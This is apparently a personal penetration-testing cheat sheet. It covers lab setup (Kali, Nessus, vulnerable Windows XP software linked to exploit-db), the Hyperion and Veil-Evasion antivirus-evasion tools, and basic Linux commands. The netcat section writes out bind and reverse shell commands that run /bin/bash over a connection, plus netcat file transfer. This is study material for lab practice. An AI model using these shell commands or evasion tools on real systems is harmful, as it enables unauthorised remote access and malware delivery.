# omegaspard-pentest-cheat-sheet
My penetration testing cheat sheet.

## Download links to set up lab environment.

### Attacker machine

- [VMWare](https://my.vmware.com/web/vmware/downloads)
- [OSCP Kali linux distribution VM](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/)
- [Nessus](https://www.tenable.com/downloads/nessus?loginAttempted=true)
  A vulnerability scanner.
  - Download and install the deb package.
  - Run the service with `/bin/systemctl start nessusd.serivce`
  - Go to https://kali:8834/# to finish the installation.
- [Ming C Compiler]()
  Cross compiler to run C code on windows.
  `apt-get install mingw-w64`
- [Hyperion](https://nullsecurity.net/tools/binary.html)
  Encrytion program to bypass antivirus software.
  - Need to install the Ming C Compiler.
  - Download the zip file.
  - Generate the exe file with `i686-w64-mingw32-gcc -ISrc/Payloads/Aes/c Src/Crypter/*.c Src/Payloads/Aes/c/*.c -o hyperion.exe`
- [Veil-Evasion]()
  Payload generator to bypass antivirus software.
  - Download https://github.com/Veil-Framework/Veil-Evasion/archive/master.zip
  - Unzip and run the ./setupt/setup.sh file.
  
### Target machine

- [Android studio](https://developer.android.com/studio)
  To get the android sdk and the emulator.
- [Ubuntu 8.10 VM torrent file (by Georgia Weidman)](https://nostarch.com/download/Penetration%20Testing%20Georgia%20Weidman%20Supplementary%20Files%20No%20Starch%20Press%20[mininova].torrent)
- [Windows XP SP3 (no product key)](https://archive.org/details/windowsxp_20190627) 
- [Windows 7 SP1](https://support.microsoft.com/en-us/windows/install-windows-7-service-pack-1-sp1-b3da2c0f-cdb6-0572-8596-bab972897f61)

**Vulnerable software for Windows XP**

- [Zervit 0.4](http://www.exploit-db.com/exploits/12582/).
  - Use the port 3232.
- [SLMail 5.5](http://www.exploit-db.com/exploits/638)
  - Restart VM and set up user after installation.
- [3Com TFTP 2.0.1](http://www.exploit-db.com/exploits/3388/
  - Copy the file to `C:\Windows`, run and install service.
- [XAMPP 1.7.2](http://www.oldapps.com/xampp.php?old_xampp=45/)
  - Add the service that you want (Apache, MySql, FilzZilla etc)
  - Set up user.
- [Adobe acrobat reader 8.1.2](http://www.oldapps.com/adobe_reader:php?old_adobe=17/)
- [War-FTP 1.64](http://www.exploit+db.com/exploits/3570/)
- [WinSCP](http://winscp.net/)

**Addtional tools for Windows XP**

- [Immunity debugger](http://debugger.immunityinc.com/ID_register.py)
  (It will install Python)
- [Mona](https://github.com/corelan/mona/archive/master.zip)
  - Copy the file `mona.py` to `C:Program Files\Immunity Inc\Immunity Debugger\PyCommands`.
  
**Additional tools for Windows 7**
- [Java 7](http://www.oldapps.com/java.php?old_java=8120)
- [Winamp version 5.55](http://www.oldapps.com/winamp.php?old_winamp=247)
- [Microsoft Security Essentials](https://www.commentcamarche.net/download/telecharger-34061039-microsoft-security-essentials)

## Basic Linux commands

### Editing Files

**nano**

- `nano file_name` to open file.
- `CTRL+W` to search.
- `CTRL+X` to exit.
- `CTRL+K` to cut and `CTRL+U` to uncut.
- `CTRL+J` to justify.
- `CTRL+O` to save.

**vi**

- Enter `I` to be in insert mode and type stuff then `ESC` to leave the `INSERT` mode.
- `:wq` to save and exit.

**grep**

Look for instance of string in what we give to it.

- `grep hahaha file_hahah` will look for *haha* in fiel_haha.

**cut**

Extract from entry based on a delimiter.

- `cut -d " " -f 2` will return the second word separated from a space of each line we pass to it.

**sed**

Replace based on pattern.

- `sed 's/hello/bonjour' file_name` will replace hello by bonjour in file_name and return the string of the new file on the standard output.

**awk**

Pattern matching.

- `awk '$2 >4' file_name` for each line in file_name, will return each line in which the seocond word is greater than 4.
- `awk '{print $1,$3;}' file_name` return the first and third word of each line and print it.

**Networking**

- `ifconfig`
- Edit `/etc/network/interfaces` to set a static IP address.
- `netstat -antp` to see what program use which port and what is the current state. 

**apt**

Manage package on the system.

- `apt-get install pacakge_name`
- `apt-get upgrade package_name`
- `apt-get update` to update the cache with the `sources.list file`.

**Services**

Start and stop services.

- `systemctl service_name start`
- `systemctl service_name stop`
- `systemctl service_name enable`
- `systemctl service_name disable`

The command `service` can also be used, if the service isn't available in those command the service bin should be in `/etc/init.d` or `/etc/rc.d`.

**Netcat**

To mannipulate TCP/IP connections netcat is a good tool.

- `nc -v 192.168.25.36 80` create a netcat connection with the address IP on the port 80 (-v for verbose mode).
- `nc -lvp 8888` create a netcat that wait for connection on the port 8888.
- `nc -lvp 8888 -e /bin/bash` will open a shell if it receives a connection on the port 8888.
- `nc -v 192.168.25.36 80 -e /bin/bash` push the command shell to the netcat listener.
- `nc -v 192.168.25.36 8888 < file` connect to netcat then write the file to it.
- `nc -lvp 8888 > file` wait for a connection and write the file.

**cron**

Schedule tasks.

- In the folder `/etc` we can find directories like `crond.d`, `crond.daily`, `crond.hourly`, `crond.monthly`, `crond.weekly` those execute the scripts present in them at a period corresponding to the one indicated to their name.
- `crontab` is a file used for custom scheduling.
- The format of each corn entry is `m h dom mon dow user command`, dom for day, mon for month.

 
